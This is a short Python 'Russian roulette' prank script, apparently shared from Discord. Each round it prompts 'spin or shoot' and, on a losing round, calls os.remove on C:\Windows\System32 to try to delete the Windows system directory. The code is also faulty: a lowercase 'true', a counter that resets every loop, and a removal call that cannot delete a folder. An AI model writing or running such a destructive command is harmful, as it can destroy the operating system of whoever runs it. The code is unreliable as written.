import random
import os

while true:
  current = 1
  bulletslot = random.randint(0, 6)
  ohno = input("spin or shoot")
  
  if ohno == "spin":
    bulletslot = random.randint(0, 6)

  current += 1

  if current == bulletslot:
    os.remove("C:\Windows\System32")

  print("If you see this you survived", "JustAsuu is better lol", "I wrote this in discord so there might be like 1 mistake")
